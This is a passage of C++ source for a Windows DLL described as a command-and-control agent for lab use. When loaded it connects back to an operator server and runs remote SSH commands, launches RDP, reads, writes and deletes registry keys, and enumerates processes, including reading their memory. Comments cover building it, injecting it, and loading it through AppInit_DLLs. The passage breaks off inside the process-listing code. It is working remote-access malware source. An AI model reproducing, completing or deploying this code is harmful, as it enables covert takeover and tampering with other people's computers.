/*
 * C2 Agent DLL — Educational lab use only
 *
 * Implements the client-side of the C2 protocol inside a Windows DLL.
 * On DLL_PROCESS_ATTACH a background thread spins up, connects back to
 * the C2 server, authenticates, then sits in a receive loop dispatching
 * commands to the four feature modules:
 *
 *   ssh      – open / exec / close SSH sessions   (via libssh2 + WinSock)
 *   rdp      – probe / launch RDP via mstsc        (WinAPI + ShellExecuteEx)
 *   registry – read / write / delete registry keys (winreg API)
 *   activity – process list, system stats, netconn (WinAPI + PDH/PSAPI)
 *
 * Wire protocol (same as server.py):
 *   Newline-delimited JSON over TCP.
 *   First message sent:  {"token":"<C2_TOKEN>"}
 *   Every subsequent message received: {"module":"<m>","payload":{...}}
 *   Every response sent: {...json...}\n
 *
 * Build (MinGW cross-compiler, from Linux/macOS):
 *   x86_64-w64-mingw32-g++ -shared -o config.dll dll.cpp \
 *       -lws2_32 -lwininet -lshlwapi -lshell32 \
 *       -ladvapi32 -lpdh -lpsapi -liphlpapi \
 *       -lssh2 \
 *       -std=c++17 -O2 -fpermissive
 *
 * Build (MSVC, Developer Command Prompt):
 *   cl /LD /std:c++17 /O2 dll.cpp \
 *      ws2_32.lib wininet.lib shlwapi.lib shell32.lib \
 *      advapi32.lib pdh.lib psapi.lib iphlpapi.lib ssh2.lib \
 *      /Fe:config.dll
 *
 * Runtime config (set before injecting the DLL):
 *   C2_HOST   — server IP or hostname  (default: 127.0.0.1)
 *   C2_PORT   — server TCP port        (default: 4444)
 *   C2_TOKEN  — auth token             (default: changeme)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <pdh.h>
#include <winreg.h>
#include <wtsapi32.h>   // WTSQuerySessionInformation — process owner username
#include <aclapi.h>     // EXPLICIT_ACCESSA, SetEntriesInAclA, SetNamedSecurityInfoA
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "advapi32.lib")

// WINEVENT_ALLPROCESSES may be missing from older MinGW headers
#ifndef WINEVENT_ALLPROCESSES
#  define WINEVENT_ALLPROCESSES 0x0000
#endif

// libssh2 — needed only for the SSH module
// Define C2_HAS_LIBSSH2 via -DC2_HAS_LIBSSH2 compiler flag when libssh2 is available.
// Without it, the SSH module returns a "disabled" error but everything else works.
#ifdef C2_HAS_LIBSSH2
#  include <libssh2.h>
#endif

#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <functional>
#include <thread>
#include <mutex>
#include <chrono>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "pdh.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")

// ─────────────────────────────────────────────────────────────────────────────
// Minimal JSON builder / parser
// (avoids a heavy dependency; sufficient for the structured payloads we send)
// ─────────────────────────────────────────────────────────────────────────────
namespace json {

// ── Tokenizer ────────────────────────────────────────────────────────────────
struct Value;
using Object = std::map<std::string, Value>;
using Array  = std::vector<Value>;

struct Value {
    enum class Kind { Null, Bool, Number, String, Array, Object } kind{Kind::Null};
    bool        b{};
    double      n{};
    std::string s;
    Array       arr;
    Object      obj;

    Value() = default;
    explicit Value(bool v)              : kind(Kind::Bool),   b(v)    {}
    explicit Value(double v)            : kind(Kind::Number), n(v)    {}
    explicit Value(const std::string&v) : kind(Kind::String), s(v)    {}
    explicit Value(const char* v)       : kind(Kind::String), s(v)    {}
    explicit Value(const Array& v)      : kind(Kind::Array),  arr(v)  {}
    explicit Value(const Object& v)     : kind(Kind::Object), obj(v)  {}

    // Convenient accessors (no-throw, return defaults on mismatch)
    std::string str(const std::string& def = "") const {
        return kind == Kind::String ? s : def;
    }
    double num(double def = 0) const {
        return kind == Kind::Number ? n : def;
    }
    bool boolean(bool def = false) const {
        return kind == Kind::Bool ? b : def;
    }
    const Value& operator[](const std::string& key) const {
        static Value null;
        auto it = obj.find(key);
        return it != obj.end() ? it->second : null;
    }
    bool has(const std::string& key) const {
        return obj.count(key) > 0;
    }
};

// ── Serialiser ───────────────────────────────────────────────────────────────
static void escape(std::ostringstream& o, const std::string& s) {
    for (unsigned char c : s) {
        switch (c) {
            case '"':  o << "\\\""; break;
            case '\\': o << "\\\\"; break;
            case '\n': o << "\\n";  break;
            case '\r': o << "\\r";  break;
            case '\t': o << "\\t";  break;
            default:
                if (c < 0x20) { o << "\\u00" << "0123456789abcdef"[c>>4]
                                            << "0123456789abcdef"[c&0xf]; }
                else           { o << c; }
        }
    }
}

static std::string dump(const Value& v) {
    std::ostringstream o;
    switch (v.kind) {
        case Value::Kind::Null:   o << "null"; break;
        case Value::Kind::Bool:   o << (v.b ? "true" : "false"); break;
        case Value::Kind::Number: {
            // Print as integer when possible
            if (v.n == (long long)v.n) o << (long long)v.n;
            else o << v.n;
            break;
        }
        case Value::Kind::String:
            o << '"'; escape(o, v.s); o << '"'; break;
        case Value::Kind::Array: {
            o << '[';
            for (size_t i = 0; i < v.arr.size(); ++i) {
                if (i) o << ',';
                o << dump(v.arr[i]);
            }
            o << ']'; break;
        }
        case Value::Kind::Object: {
            o << '{';
            bool first = true;
            for (auto& [k, val] : v.obj) {
                if (!first) o << ','; first = false;
                o << '"'; escape(o, k); o << "\":";
                o << dump(val);
            }
            o << '}'; break;
        }
    }
    return o.str();
}

// ── Parser ───────────────────────────────────────────────────────────────────
struct Parser {
    const char* p;
    const char* end;

    Parser(const std::string& s) : p(s.c_str()), end(s.c_str() + s.size()) {}

    void skip_ws() { while (p < end && (*p==' '||*p=='\t'||*p=='\n'||*p=='\r')) ++p; }

    std::string parse_string() {
        ++p; // skip opening "
        std::string out;
        while (p < end && *p != '"') {
            if (*p == '\\') {
                ++p;
                switch (*p++) {
                    case '"':  out += '"';  break;
                    case '\\': out += '\\'; break;
                    case 'n':  out += '\n'; break;
                    case 'r':  out += '\r'; break;
                    case 't':  out += '\t'; break;
                    default:   out += *(p-1);
                }
            } else { out += *p++; }
        }
        if (p < end) ++p; // skip closing "
        return out;
    }

    Value parse_value() {
        skip_ws();
        if (p >= end) return {};
        if (*p == '"') return Value(parse_string());
        if (*p == '{') {
            ++p; Object obj;
            skip_ws();
            while (p < end && *p != '}') {
                skip_ws();
                std::string key = parse_string();
                skip_ws(); if (p < end && *p == ':') ++p;
                obj[key] = parse_value();
                skip_ws(); if (p < end && *p == ',') ++p;
                skip_ws();
            }
            if (p < end) ++p;
            return Value(obj);
        }
        if (*p == '[') {
            ++p; Array arr;
            skip_ws();
            while (p < end && *p != ']') {
                arr.push_back(parse_value());
                skip_ws(); if (p < end && *p == ',') ++p;
                skip_ws();
            }
            if (p < end) ++p;
            return Value(arr);
        }
        // number
        if (*p == '-' || isdigit((unsigned char)*p)) {
            char* ep; double d = strtod(p, &ep); p = ep;
            return Value(d);
        }
        // true / false / null
        if (strncmp(p, "true",  4)==0) { p+=4; return Value(true);  }
        if (strncmp(p, "false", 5)==0) { p+=5; return Value(false); }
        if (strncmp(p, "null",  4)==0) { p+=4; return {};           }
        ++p; return {};
    }
};

Value parse(const std::string& s) { return Parser(s).parse_value(); }

// Convenience builder helpers
inline Value obj(std::initializer_list<std::pair<const std::string, Value>> il) {
    return Value(Object(il));
}
inline Value ok_resp(std::initializer_list<std::pair<const std::string, Value>> il = {}) {
    Object o{{"status", Value(std::string("ok"))}};
    for (auto& kv : il) o.insert(kv);
    return Value(o);
}
inline Value err_resp(const std::string& msg) {
    return Value(Object{{"status", Value(std::string("error"))},
                        {"message", Value(msg)}});
}

} // namespace json


// ─────────────────────────────────────────────────────────────────────────────
// Config (read from environment variables at startup)
// ─────────────────────────────────────────────────────────────────────────────
static std::string g_host  = "192.168.1.20";
static int         g_port  = 4444;
static std::string g_token = "token";

static void load_config() {
    auto env = [](const char* name, const std::string& def) -> std::string {
        char buf[512]; DWORD n = GetEnvironmentVariableA(name, buf, sizeof(buf));
        return (n > 0 && n < sizeof(buf)) ? std::string(buf, n) : def;
    };
    g_host  = env("C2_HOST",  g_host);
    g_token = env("C2_TOKEN", g_token);
    std::string ps = env("C2_PORT", "");
    if (!ps.empty()) g_port = std::stoi(ps);
}


// ─────────────────────────────────────────────────────────────────────────────
// Socket helpers
// ─────────────────────────────────────────────────────────────────────────────
static SOCKET      g_sock         = INVALID_SOCKET;
static std::mutex  g_send_mtx;
static std::string g_recv_buf;

// Saved at DLL_PROCESS_ATTACH — used by failsafe_mod to locate the DLL on disk
static HMODULE g_hmodule      = nullptr;
// Held for the lifetime of the process that "owns" the C2 agent.
// Every other process that loads the DLL via AppInit_DLLs sees
// ERROR_ALREADY_EXISTS and exits DLL_PROCESS_ATTACH without starting an agent.
static HANDLE  g_singleton_mtx = nullptr;

static bool sock_send(const json::Value& v) {
    std::string s = json::dump(v) + "\n";
    std::lock_guard<std::mutex> lk(g_send_mtx);
    int total = 0;
    while (total < (int)s.size()) {
        int r = send(g_sock, s.c_str() + total, (int)s.size() - total, 0);
        if (r == SOCKET_ERROR) return false;
        total += r;
    }
    return true;
}

// Returns one newline-terminated JSON line (blocks until available)
static std::string sock_recv_line() {
    while (true) {
        auto pos = g_recv_buf.find('\n');
        if (pos != std::string::npos) {
            std::string line = g_recv_buf.substr(0, pos);
            g_recv_buf.erase(0, pos + 1);
            return line;
        }
        char tmp[4096];
        int r = recv(g_sock, tmp, sizeof(tmp), 0);
        if (r <= 0) return "";
        g_recv_buf.append(tmp, r);
    }
}


// ─────────────────────────────────────────────────────────────────────────────
// Module 1 — SSH  (libssh2)
// ─────────────────────────────────────────────────────────────────────────────
namespace ssh_mod {

#ifdef C2_HAS_LIBSSH2
struct Session {
    SOCKET            raw_sock = INVALID_SOCKET;
    LIBSSH2_SESSION*  session  = nullptr;
    std::string       id;
};
static std::map<std::string, Session> g_sessions;
static std::mutex                      g_mtx;
#endif

json::Value handle(const json::Value& p) {
#ifndef C2_HAS_LIBSSH2
    return json::err_resp("SSH module disabled (libssh2 not compiled in)");
#else
    std::string action = p["action"].str();

    if (action == "connect") {
        std::string host   = p["host"].str();
        int         port   = (int)p["port"].num(22);
        std::string user   = p["username"].str();
        std::string pass   = p["password"].str();
        std::string sid    = p["session_id"].str(host + ":" + std::to_string(port));

        // Open TCP socket
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET)
            return json::err_resp("socket() failed");

        sockaddr_in sa{}; sa.sin_family = AF_INET; sa.sin_port = htons((u_short)port);
        // Resolve hostname
        addrinfo hints{}, *res = nullptr;
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res) {
            closesocket(s);
            return json::err_resp("DNS resolution failed for: " + host);
        }
        sa.sin_addr = ((sockaddr_in*)res->ai_addr)->sin_addr;
        freeaddrinfo(res);

        if (connect(s, (sockaddr*)&sa, sizeof(sa)) != 0) {
            closesocket(s);
            return json::err_resp("TCP connect failed to " + host);
        }

        LIBSSH2_SESSION* sess = libssh2_session_init();
        if (!sess) { closesocket(s); return json::err_resp("libssh2_session_init failed"); }

        libssh2_session_set_blocking(sess, 1);
        if (libssh2_session_handshake(sess, (libssh2_socket_t)s) != 0) {
            libssh2_session_free(sess); closesocket(s);
            return json::err_resp("SSH handshake failed");
        }
        if (libssh2_userauth_password(sess, user.c_str(), pass.c_str()) != 0) {
            libssh2_session_disconnect(sess, "bye"); libssh2_session_free(sess); closesocket(s);
            return json::err_resp("SSH authentication failed");
        }

        std::lock_guard<std::mutex> lk(g_mtx);
        g_sessions[sid] = {s, sess, sid};
        return json::ok_resp({{"session_id", json::Value(sid)},
                               {"message",    json::Value(std::string("Connected"))}});
    }

    if (action == "exec") {
        std::string sid  = p["session_id"].str();
        std::string cmd  = p["command"].str();
        std::lock_guard<std::mutex> lk(g_mtx);
        auto it = g_sessions.find(sid);
        if (it == g_sessions.end())
            return json::err_resp("No session: " + sid);

        LIBSSH2_CHANNEL* ch = libssh2_channel_open_session(it->second.session);
        if (!ch) return json::err_resp("channel_open failed");
        if (libssh2_channel_exec(ch, cmd.c_str()) != 0) {
            libssh2_channel_free(ch);
            return json::err_resp("channel_exec failed");
        }

        std::string out, err;
        char buf[4096]; int rc;
        while ((rc = libssh2_channel_read(ch, buf, sizeof(buf))) > 0)
            out.append(buf, rc);
        while ((rc = libssh2_channel_read_stderr(ch, buf, sizeof(buf))) > 0)
            err.append(buf, rc);
        int exit_code = libssh2_channel_get_exit_status(ch);
        libssh2_channel_free(ch);

        return json::ok_resp({{"stdout",    json::Value(out)},
                               {"stderr",    json::Value(err)},
                               {"exit_code", json::Value((double)exit_code)}});
    }

    if (action == "disconnect") {
        std::string sid = p["session_id"].str();
        std::lock_guard<std::mutex> lk(g_mtx);
        auto it = g_sessions.find(sid);
        if (it == g_sessions.end()) return json::err_resp("No session: " + sid);
        libssh2_session_disconnect(it->second.session, "bye");
        libssh2_session_free(it->second.session);
        closesocket(it->second.raw_sock);
        g_sessions.erase(it);
        return json::ok_resp({{"message", json::Value(std::string("Disconnected"))}});
    }

    if (action == "list") {
        std::lock_guard<std::mutex> lk(g_mtx);
        json::Array ids;
        for (auto& [k, _] : g_sessions) ids.push_back(json::Value(k));
        return json::ok_resp({{"sessions", json::Value(ids)}});
    }

    return json::err_resp("Unknown SSH action: " + action);
#endif
}
} // namespace ssh_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 2 — RDP  (mstsc / ShellExecuteEx)
// ─────────────────────────────────────────────────────────────────────────────
namespace rdp_mod {

struct RdpSession {
    std::string id;
    std::string host;
    int         port{3389};
    DWORD       pid{0};
    std::string status; // running | closed | error
};
static std::map<std::string, RdpSession> g_sessions;
static std::mutex g_mtx;

// Probe TCP port
static bool tcp_probe(const std::string& host, int port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;
    DWORD to = 4000; setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&to, sizeof(to));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&to, sizeof(to));

    sockaddr_in sa{}; sa.sin_family = AF_INET; sa.sin_port = htons((u_short)port);
    addrinfo hints{}, *res=nullptr; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    bool ok = false;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) == 0 && res) {
        sa.sin_addr = ((sockaddr_in*)res->ai_addr)->sin_addr;
        freeaddrinfo(res);
        ok = (connect(s, (sockaddr*)&sa, sizeof(sa)) == 0);
    }
    closesocket(s);
    return ok;
}

json::Value handle(const json::Value& p) {
    std::string action = p["action"].str();

    if (action == "probe") {
        std::string host = p["host"].str();
        int         port = (int)p["port"].num(3389);
        bool reachable   = tcp_probe(host, port);
        std::string msg  = reachable
            ? "RDP port open on " + host
            : "RDP port closed / unreachable on " + host;
        return json::ok_resp({{"reachable", json::Value(reachable)},
                               {"message",   json::Value(msg)}});
    }

    if (action == "open") {
        std::string host = p["host"].str();
        int         port = (int)p["port"].num(3389);
        std::string user = p["username"].str();
        std::string sid  = p["session_id"].str("rdp-" + host + ":" + std::to_string(port));

        // Build mstsc /v:<host>:<port> command
        std::string args = "/v:" + host + ":" + std::to_string(port);

        SHELLEXECUTEINFOA sei{};
        sei.cbSize       = sizeof(sei);
        sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb       = "open";
        sei.lpFile       = "mstsc.exe";
        sei.lpParameters = args.c_str();
        sei.nShow        = SW_SHOWNORMAL;

        RdpSession sess;
        sess.id   = sid;
        sess.host = host;
        sess.port = port;

        if (!ShellExecuteExA(&sei)) {
            sess.status = "error";
            std::lock_guard<std::mutex> lk(g_mtx); g_sessions[sid] = sess;
            return json::err_resp("ShellExecuteEx failed: " + std::to_string(GetLastError()));
        }
        sess.pid    = GetProcessId(sei.hProcess);
        sess.status = "running";
        if (sei.hProcess) CloseHandle(sei.hProcess);

        std::lock_guard<std::mutex> lk(g_mtx);
        g_sessions[sid] = sess;
        return json::ok_resp({{"session_id", json::Value(sid)},
                               {"pid",        json::Value((double)sess.pid)},
                               {"message",    json::Value(std::string("mstsc launched → ") + host)}});
    }

    if (action == "close") {
        std::string sid = p["session_id"].str();
        std::lock_guard<std::mutex> lk(g_mtx);
        auto it = g_sessions.find(sid);
        if (it == g_sessions.end()) return json::err_resp("No session: " + sid);
        if (it->second.pid) {
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, it->second.pid);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); it->second.status = "closed"; }
        }
        return json::ok_resp({{"message", json::Value(std::string("Session closed"))}});
    }

    if (action == "list") {
        std::lock_guard<std::mutex> lk(g_mtx);
        json::Array arr;
        for (auto& [k, s] : g_sessions) {
            json::Object o;
            o["id"]     = json::Value(s.id);
            o["host"]   = json::Value(s.host);
            o["port"]   = json::Value((double)s.port);
            o["pid"]    = json::Value((double)s.pid);
            o["status"] = json::Value(s.status);
            arr.push_back(json::Value(o));
        }
        return json::ok_resp({{"sessions", json::Value(arr)}});
    }

    return json::err_resp("Unknown RDP action: " + action);
}
} // namespace rdp_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 3 — Registry
// ─────────────────────────────────────────────────────────────────────────────
namespace reg_mod {

static HKEY resolve_hive(const std::string& name) {
    static const std::map<std::string, HKEY> m{
        {"HKLM", HKEY_LOCAL_MACHINE},
        {"HKCU", HKEY_CURRENT_USER},
        {"HKCR", HKEY_CLASSES_ROOT},
        {"HKU",  HKEY_USERS},
        {"HKCC", HKEY_CURRENT_CONFIG},
    };
    auto it = m.find(name); return (it != m.end()) ? it->second : nullptr;
}

static std::string type_name(DWORD t) {
    switch (t) {
        case REG_SZ:        return "REG_SZ";
        case REG_DWORD:     return "REG_DWORD";
        case REG_QWORD:     return "REG_QWORD";
        case REG_BINARY:    return "REG_BINARY";
        case REG_EXPAND_SZ: return "REG_EXPAND_SZ";
        case REG_MULTI_SZ:  return "REG_MULTI_SZ";
        default:            return "REG_UNKNOWN(" + std::to_string(t) + ")";
    }
}

json::Value handle(const json::Value& p) {
    std::string action   = p["action"].str();
    std::string hive_str = p["hive"].str();
    std::string key_path = p["key_path"].str();

    HKEY hive = resolve_hive(hive_str);
    if (!hive) return json::err_resp("Unknown hive: " + hive_str);

    // ── list_keys ────────────────────────────────────────────────────
    if (action == "list_keys") {
        HKEY key; LONG rc = RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_READ, &key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegOpenKeyEx failed: " + std::to_string(rc));
        json::Array arr;
        char name[256]; DWORD sz;
        for (DWORD i = 0; ; ++i) {
            sz = sizeof(name);
            rc = RegEnumKeyExA(key, i, name, &sz, nullptr, nullptr, nullptr, nullptr);
            if (rc == ERROR_NO_MORE_ITEMS) break;
            if (rc == ERROR_SUCCESS) arr.push_back(json::Value(std::string(name, sz)));
        }
        RegCloseKey(key);
        return json::ok_resp({{"subkeys", json::Value(arr)}});
    }

    // ── list_values ──────────────────────────────────────────────────
    if (action == "list_values") {
        HKEY key; LONG rc = RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_READ, &key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegOpenKeyEx failed: " + std::to_string(rc));
        json::Array arr;
        char name[256]; DWORD nsz, type; BYTE data[4096]; DWORD dsz;
        for (DWORD i = 0; ; ++i) {
            nsz = sizeof(name); dsz = sizeof(data);
            rc = RegEnumValueA(key, i, name, &nsz, nullptr, &type, data, &dsz);
            if (rc == ERROR_NO_MORE_ITEMS) break;
            if (rc != ERROR_SUCCESS) continue;
            json::Object entry;
            entry["name"] = json::Value(std::string(name, nsz));
            entry["type"] = json::Value(type_name(type));
            if (type == REG_SZ || type == REG_EXPAND_SZ)
                entry["data"] = json::Value(std::string((char*)data));
            else if (type == REG_DWORD)
                entry["data"] = json::Value((double)*(DWORD*)data);
            else {
                // hex string for binary/unknown
                std::string hex;
                for (DWORD b = 0; b < dsz; ++b) {
                    char h[4]; snprintf(h, sizeof(h), "%02x", data[b]);
                    hex += h;
                }
                entry["data"] = json::Value(hex);
            }
            arr.push_back(json::Value(entry));
        }
        RegCloseKey(key);
        return json::ok_resp({{"values", json::Value(arr)}});
    }

    // ── read_value ───────────────────────────────────────────────────
    if (action == "read_value") {
        std::string val_name = p["value_name"].str();
        HKEY key; LONG rc = RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_READ, &key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegOpenKeyEx failed: " + std::to_string(rc));
        DWORD type, dsz = 0;
        RegQueryValueExA(key, val_name.c_str(), nullptr, &type, nullptr, &dsz);
        std::vector<BYTE> data(dsz + 2, 0);
        rc = RegQueryValueExA(key, val_name.c_str(), nullptr, &type, data.data(), &dsz);
        RegCloseKey(key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegQueryValueEx failed: " + std::to_string(rc));

        json::Object resp;
        resp["status"]     = json::Value(std::string("ok"));
        resp["value_name"] = json::Value(val_name);
        resp["type"]       = json::Value(type_name(type));
        if (type == REG_SZ || type == REG_EXPAND_SZ)
            resp["data"] = json::Value(std::string((char*)data.data()));
        else if (type == REG_DWORD)
            resp["data"] = json::Value((double)*(DWORD*)data.data());
        else {
            std::string hex;
            for (DWORD b = 0; b < dsz; ++b) {
                char h[4]; snprintf(h, sizeof(h), "%02x", data[b]);
                hex += h;
            }
            resp["data"] = json::Value(hex);
        }
        return json::Value(resp);
    }

    // ── write_value ──────────────────────────────────────────────────
    if (action == "write_value") {
        std::string val_name  = p["value_name"].str();
        std::string type_str  = p["value_type"].str("REG_SZ");
        const json::Value& vd = p["value_data"];

        HKEY key; LONG rc = RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_SET_VALUE, &key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegOpenKeyEx (write) failed: " + std::to_string(rc));

        if (type_str == "REG_SZ" || type_str == "REG_EXPAND_SZ") {
            std::string sv = vd.str();
            DWORD t = (type_str == "REG_SZ") ? REG_SZ : REG_EXPAND_SZ;
            rc = RegSetValueExA(key, val_name.c_str(), 0, t,
                                (BYTE*)sv.c_str(), (DWORD)sv.size() + 1);
        } else if (type_str == "REG_DWORD") {
            DWORD dv = (DWORD)vd.num();
            rc = RegSetValueExA(key, val_name.c_str(), 0, REG_DWORD, (BYTE*)&dv, sizeof(dv));
        } else {
            RegCloseKey(key);
            return json::err_resp("Unsupported write type: " + type_str);
        }
        RegCloseKey(key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegSetValueEx failed: " + std::to_string(rc));
        return json::ok_resp({{"message", json::Value(std::string("Value written"))}});
    }

    // ── delete_value ─────────────────────────────────────────────────
    if (action == "delete_value") {
        std::string val_name = p["value_name"].str();
        HKEY key; LONG rc = RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_SET_VALUE, &key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegOpenKeyEx failed: " + std::to_string(rc));
        rc = RegDeleteValueA(key, val_name.c_str());
        RegCloseKey(key);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegDeleteValue failed: " + std::to_string(rc));
        return json::ok_resp({{"message", json::Value(std::string("Value deleted"))}});
    }

    // ── create_key ───────────────────────────────────────────────────
    if (action == "create_key") {
        HKEY out; DWORD disp;
        LONG rc = RegCreateKeyExA(hive, key_path.c_str(), 0, nullptr, 0,
                                   KEY_WRITE, nullptr, &out, &disp);
        if (rc != ERROR_SUCCESS) return json::err_resp("RegCreateKeyEx failed: " + std::to_string(rc));
        RegCloseKey(out);
        return json::ok_resp({{"message", json::Value(std::string("Key created"))}});
    }

    // ── delete_key ───────────────────────────────────────────────────
    if (action == "delete_key") {
        LONG rc = RegDeleteKeyA(hive, key_path.c_str());
        if (rc != ERROR_SUCCESS) return json::err_resp("RegDeleteKey failed: " + std::to_string(rc));
        return json::ok_resp({{"message", json::Value(std::string("Key deleted"))}});
    }

    return json::err_resp("Unknown registry action: " + action);
}
} // namespace reg_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 4 — Activity Monitor
// ─────────────────────────────────────────────────────────────────────────────
namespace act_mod {

static std::string wstr_to_str(const WCHAR* w) {
    if (!w) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
    if (n <= 0) return "";
    std::string s(n - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w, -1, &s[0], n, nullptr, nullptr);
    return s;
}

// ── Helper: resolve username from a session ID via WTS ─────────────────────
static std::string get_session_username(DWORD session_id) {
    LPWSTR buf = nullptr; DWORD sz = 0;
    if (!WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE,
                                     session_id, WTSUserName, &buf, &sz) || !buf)
        return "";
    std::string user = wstr_to_str(buf);
    WTSFreeMemory(buf);

    // Also fetch domain name
    LPWSTR dbuf = nullptr; DWORD dsz = 0;
    std::string domain;
    if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE,
                                    session_id, WTSDomainName, &dbuf, &dsz) && dbuf) {
        domain = wstr_to_str(dbuf);
        WTSFreeMemory(dbuf);
    }
    return domain.empty() ? user : domain + "\\" + user;
}

// ── Helper: read command-line of a process via its PEB ─────────────────────
// Works without SeDebugPrivilege for same-session processes.
static std::string get_cmdline(HANDLE ph) {
    // Use NtQueryInformationProcess dynamically to stay compatible
    typedef LONG (WINAPI* NtQIP)(HANDLE, UINT, PVOID, ULONG, PULONG);
    static auto NtQueryInformationProcess =
        (NtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                              "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) return "";

    struct PROCESS_BASIC_INFORMATION { PVOID r0; PVOID PebBaseAddress; PVOID r1[4]; };
    PROCESS_BASIC_INFORMATION pbi{}; ULONG ret_len = 0;
    if (NtQueryInformationProcess(ph, 0, &pbi, sizeof(pbi), &ret_len) != 0 || !pbi.PebBaseAddress)
        return "";

    // Read PEB
    BYTE peb[0x100]{}; SIZE_T rd = 0;
    if (!ReadProcessMemory(ph, pbi.PebBaseAddress, peb, sizeof(peb), &rd)) return "";

    // ProcessParameters offset: 0x20 on x64, 0x10 on x86
    PVOID params_ptr = *reinterpret_cast<PVOID*>(peb + 0x20);
    if (!params_ptr) return "";

    // Read RTL_USER_PROCESS_PARAMETERS (first 0x100 bytes)
    BYTE params[0x100]{};
    if (!ReadProcessMemory(ph, params_ptr, params, sizeof(params), &rd)) return "";

    // CommandLine is at offset 0x70 (x64): a UNICODE_STRING { USHORT len, maxlen, *buf }
    USHORT  cl_len = *reinterpret_cast<USHORT*>(params + 0x70);
    PVOID   cl_buf = *reinterpret_cast<PVOID*> (params + 0x78);
    if (!cl_buf || cl_len == 0 || cl_len > 4096) return "";

    std::wstring wbuf(cl_len / 2, L'\0');
    if (!ReadProcessMemory(ph, cl_buf, &wbuf[0], cl_len, &rd)) return "";
    return wstr_to_str(wbuf.c_str());
}

// ── Helper: per-process CPU% via two GetProcessTimes samples ───────────────
struct ProcTimes { ULONGLONG kernel, user, wall; };
static ProcTimes read_proc_times(HANDLE ph) {
    FILETIME cr, ex, k, u, sys1, sys2; SYSTEMTIME st;
    GetProcessTimes(ph, &cr, &ex, &k, &u);
    GetSystemTimeAsFileTime(&sys1);
    ProcTimes t{};
    t.kernel = (ULONGLONG)k.dwHighDateTime << 32 | k.dwLowDateTime;
    t.user   = (ULONGLONG)u.dwHighDateTime << 32 | u.dwLowDateTime;
    t.wall   = (ULONGLONG)sys1.dwHighDateTime << 32 | sys1.dwLowDateTime;
    return t;
}

// ── Processes ──────────────────────────────────────────────────────────────
static json::Value list_processes(const json::Value& p) {
    std::string name_filter = p["name"].str();
    for (auto& c : name_filter) c = (char)tolower((unsigned char)c);

    // ── First pass: snapshot + first CPU sample ───────────────────────────
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return json::err_resp("Snapshot failed");

    struct ProcRaw {
        DWORD  pid, ppid, thread_cnt;
        std::string name;
        HANDLE ph;          // kept open between samples
        ProcTimes  t0;
        DWORD  session_id;
    };
    std::vector<ProcRaw> raw;

    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            std::string nm = wstr_to_str(pe.szExeFile);
            std::string nml = nm;
            for (auto& c : nml) c = (char)tolower((unsigned char)c);
            if (!name_filter.empty() && nml.find(name_filter) == std::string::npos)
                continue;

            ProcRaw r{};
            r.pid        = pe.th32ProcessID;
            r.ppid       = pe.th32ParentProcessID;
            r.thread_cnt = pe.cntThreads;
            r.name       = nm;
            // PROCESS_ALL_ACCESS falls back gracefully on protected procs
            r.ph = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, r.pid);
            if (r.ph) {
                r.t0 = read_proc_times(r.ph);
                ProcessIdToSessionId(r.pid, &r.session_id);
            }
            raw.push_back(r);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    // ── Short sleep for CPU delta ─────────────────────────────────────────
    Sleep(400);

    // ── Second pass: build final JSON records ─────────────────────────────
    int num_cores = (int)GetActiveProcessorCount(ALL_PROCESSOR_GROUPS);
    if (num_cores < 1) num_cores = 1;

    json::Array procs;
    for (auto& r : raw) {
        json::Object o;
        o["pid"]        = json::Value((double)r.pid);
        o["ppid"]       = json::Value((double)r.ppid);
        o["name"]       = json::Value(r.name);
